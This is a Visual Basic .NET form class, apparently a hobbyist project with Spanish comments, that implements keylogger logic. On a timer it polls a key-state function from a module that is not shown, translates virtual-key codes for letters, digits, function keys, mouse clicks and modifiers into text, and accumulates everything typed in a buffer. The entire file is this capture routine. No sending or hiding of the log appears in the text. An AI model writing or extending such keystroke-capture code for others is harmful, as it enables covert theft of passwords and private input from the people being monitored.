Public Class Form1
    Dim Sold As String

    Private Sub command1_Click(sender As Object, e As EventArgs) Handles command1.Click
        Timer1.Enabled = True

    End Sub

    Private Sub command2_Click(sender As Object, e As EventArgs) Handles command2.Click
        Timer1.Enabled = False
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        On Error Resume Next
        Ret = GetPressedKey() 'Ret toma el valor de la tecla obtenida del modulo 
        If Ret <> Sold Then 'si ret es diferente a sold entonces 

            Sold = Ret    'correjido el error Sorry!   'sold obtiene  el valor de ret    
            If Sold Like "1" Then 'esto se hace para no capturar 2 veces o mas la misma tecla 

                Memoria = Memoria & "[click­der]" & vbNewLine
            ElseIf Sold = "2" Then
                Memoria = Memoria & "[click­izq]" & vbNewLine
            ElseIf Sold = "112" Then     Memoria = Memoria & "[f1]"

         ElseIf Sold = "113" Then
                Memoria = Memoria & "[f2]"
            ElseIf Sold = "114" Then
                Memoria = Memoria & "[f3]"
            ElseIf Sold = "115" Then
                Memoria = Memoria & "[f4]"
            ElseIf Sold = "116" Then
                Memoria = Memoria & "[f5]"
            ElseIf Sold = "117" Then
                Memoria = Memoria & "[f6]"
            ElseIf Sold = "118" Then
                Memoria = Memoria & "[f7]"
            ElseIf Sold = "119" Then
                Memoria = Memoria & "[f8]"
            ElseIf Sold = "120" Then
                Memoria = Memoria & "[f9]"
            ElseIf Sold = "121" Then
                Memoria = Memoria & "[f10]"
            ElseIf Sold = "122" Then
                Memoria = Memoria & "[f11]"
            ElseIf Sold = "123" Then
                Memoria = Memoria & "[f12]"     '///////////////////////////////////////////////////////    
            ElseIf Sold = "49" Then
                Memoria = Memoria & 1
            ElseIf Sold = "50" Then
                Memoria = Memoria & 2
            ElseIf Sold = "51" Then
                Memoria = Memoria & 3
            ElseIf Sold = "52" Then
                Memoria = Memoria & 4
            ElseIf Sold = "53" Then
                Memoria = Memoria & 5
            ElseIf Sold = "54" Then
                Memoria = Memoria & 6
            ElseIf Sold = "55" Then
                Memoria = Memoria & 7
            ElseIf Sold = "56" Then
                Memoria = Memoria & 8
            ElseIf Sold = "57" Then
                Memoria = Memoria & 9     '//////////////////////////////////////////////////////    
            ElseIf Sold = "48" Then
                Memoria = Memoria & 0
            ElseIf Sold = "8" Then '  
                Memoria = Mid(Memoria, 1, Len(Memoria) ­ 1)
            ElseIf Sold = "9" Then
                Memoria = Memoria & "[TAB]"
            ElseIf Sold = "81" Then
                Memoria = Memoria & "Q"
            ElseIf Sold = "87" Then
                Memoria = Memoria & "W"
            ElseIf Sold = "69" Then
                Memoria = Memoria & "E"
            ElseIf Sold = "82" Then
                Memoria = Memoria & "R"
            ElseIf Sold = "84" Then
                Memoria = Memoria & "T"
            ElseIf Sold = "89" Then
                Memoria = Memoria & "Y"
            ElseIf Sold = "85" Then
                Memoria = Memoria & "U"
            ElseIf Sold = "73" Then
                Memoria = Memoria & "I"
            ElseIf Sold = "79" Then
                Memoria = Memoria & "O"
            ElseIf Sold = "80" Then
                Memoria = Memoria & "P"     '//////////////////////////////////////////////////////   
            ElseIf Sold = "13" Then
                Memoria = Memoria & " [ENTER] " & vbNewLine
            ElseIf Sold = "20" Then
                Memoria = Memoria & "[MAY]"
            ElseIf Sold = "65" Then
                Memoria = Memoria & "A"
            ElseIf Sold = "83" Then
                Memoria = Memoria & "S"
            ElseIf Sold = "68" Then
                Memoria = Memoria & "D"
            ElseIf Sold = "70" Then
                Memoria = Memoria & "F"
            ElseIf Sold = "71" Then
                Memoria = Memoria & "G"
            ElseIf Sold = "72" Then
                Memoria = Memoria & "H"
            ElseIf Sold = "74" Then
                Memoria = Memoria & "J"
            ElseIf Sold = "75" Then
                Memoria = Memoria & "K"
            ElseIf Sold = "76" Then
                Memoria = Memoria & "L"     '//////////////////////////////////////////////////////    
            ElseIf Sold = "219" Then
                Memoria = Memoria & "'"
            ElseIf Sold = "221" Then
                Memoria = Memoria & "¡"
            ElseIf Sold = "220" Then
                Memoria = Memoria & "º"
            ElseIf Sold = "192" Then
                Memoria = Memoria & "Ñ"
            ElseIf Sold = "222" Then
                Memoria = Memoria & "`"
            ElseIf Sold = "191" Then
                Memoria = Memoria & "Ç"
            ElseIf Sold = "16" Then
                Memoria = Memoria & "[SHIFT]"
            ElseIf Sold = "226" Then
                Memoria = Memoria & "<"
            ElseIf Sold = "90" Then
                Memoria = Memoria & "Z"
            ElseIf Sold = "88" Then
                Memoria = Memoria & "X"
            ElseIf Sold = "67" Then
                Memoria = Memoria & "C"
            ElseIf Sold = "86" Then
                Memoria = Memoria & "V"
            ElseIf Sold = "66" Then
                Memoria = Memoria & "B"
            ElseIf Sold = "78" Then
                Memoria = Memoria & "N"
            ElseIf Sold = "77" Then
                Memoria = Memoria & "M"
            ElseIf Sold = "188" Then
                Memoria = Memoria & ","
            ElseIf Sold = "190" Then
                Memoria = Memoria & "."     '//////////////////////////////////////////////////////     
            ElseIf Sold = "189" Then
                Memoria = Memoria & "­"
            ElseIf Sold = "17" Then
                Memoria = Memoria & "[CTRL]"
            ElseIf Sold = "91" Then
                Memoria = Memoria & "[WIN­INI­DER]"
            ElseIf Sold = "18 164" Then
                Memoria = Memoria & "[ALT]"
            ElseIf Sold = "32" Then
                Memoria = Memoria & " "
            ElseIf Sold = "92" Then
                Memoria = Memoria & "[WIN­INI­IZQ]"
            ElseIf Sold = "93" Then
                Memoria = Memoria & "[WIN­PROP]"
            ElseIf Sold = "27" Then
                Memoria = Memoria & "[ESC]"     '//////////////////////////////////////////////////////    
            ElseIf Sold = "44" Then
                Memoria = Memoria & "[IMP­PANT]"
            ElseIf Sold = "145" Then
                Memoria = Memoria & "[BLOQ]"
            ElseIf Sold = "19" Then
                Memoria = Memoria & "[PAUSA]"
            ElseIf Sold = "45" Then
                Memoria = Memoria & "[INSERT]"
            ElseIf Sold = "36" Then
                Memoria = Memoria & "[INICIO]"
            ElseIf Sold = "33" Then
                Memoria = Memoria & "[RE­PAG]"
            ElseIf Sold = "46" Then
                Memoria = Memoria & "[DEL]"
            ElseIf Sold = "35" Then
                Memoria = Memoria & "[FIN]"
            ElseIf Sold = "34" Then
                Memoria = Memoria & "[AV­PAG]"
            ElseIf Sold = "38" Then
                Memoria = Memoria & "[FLECHA ARRIBA]"
            ElseIf Sold = "37" Then
                Memoria = Memoria & "[FLECHA IZQUI]"
            ElseIf Sold = "39" Then
                Memoria = Memoria & "[FLECHA DERECH]"
            ElseIf Sold = "40" Then
                Memoria = Memoria & "[FLECHA ABAJO]"
            ElseIf Sold = "144" Then
                Memoria = Memoria & "[NUM]"     '////////////////////////////////////////////////    
            ElseIf Sold = "111" Then
                Memoria = Memoria & "/"
            ElseIf Sold = "106" Then
                Memoria = Memoria & "*"
            ElseIf Sold = "109" Then
                Memoria = Memoria & "­"
            ElseIf Sold = "107" Then
                Memoria = Memoria & "+"
            ElseIf Sold = "96" Then
                Memoria = Memoria & "0"
            ElseIf Sold = "97" Then
                Memoria = Memoria & "1"
            ElseIf Sold = "98" Then
                Memoria = Memoria & "2"
            ElseIf Sold = "99" Then
                Memoria = Memoria & "3"
            ElseIf Sold = "100" Then
                Memoria = Memoria & "4"
            ElseIf Sold = "101" Then
                Memoria = Memoria & "5"
            ElseIf Sold = "102" Then
                Memoria = Memoria & "6"
            ElseIf Sold = "103" Then
                Memoria = Memoria & "7"
            ElseIf Sold = "104" Then
                Memoria = Memoria & "8"
            ElseIf Sold = "105" Then
                Memoria = Memoria & "9"
            ElseIf Sold = "18" Then
                Memoria = Memoria & "[ALT]"
            End If
        End If
    End Sub

End Class
